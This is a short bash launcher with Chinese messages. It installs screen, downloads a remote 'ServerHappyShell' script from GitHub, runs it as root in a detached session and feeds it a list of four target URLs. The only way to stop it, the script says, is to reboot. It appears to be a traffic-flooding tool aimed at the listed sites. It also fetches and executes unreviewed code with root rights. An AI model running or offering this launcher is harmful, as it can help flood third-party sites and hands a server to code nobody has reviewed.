#!/bin/bash

echo 正在检测环境
if [ -f "/usr/bin/apt-get" ]; then
    apt-get install -y screen
else
    yum install -y screen
fi
wget -O /root/JH.sh https://github.com/shiikoe/ServerHappyShell/raw/main/ServerHappyShell.sh && chmod a+x /root/JH.sh
cat >/root/list.txt <<EOF
https://betahub.cn
https://s1-1310748618.cos.ap-hongkong.myqcloud.com/fb5b280278aae2339a54208bc56b41bc.jpg
https://logo-1313772836.cos.accelerate.myqcloud.com/img/5425.jpg
http://www.9517atoriented.store/uploads/u/231005/127c6104f7d0d3c42f870428471d26bf.jpg
EOF
echo starting...
echo 若要停止,重启服务器即可
sleep 3
screen_name=$"jianhuang"  
screen -dmS $screen_name
cmd=$"bash /root/JH.sh";
screen -x -S $screen_name -p 0 -X stuff "$cmd"
screen -x -S $screen_name -p 0 -X stuff $'\n'
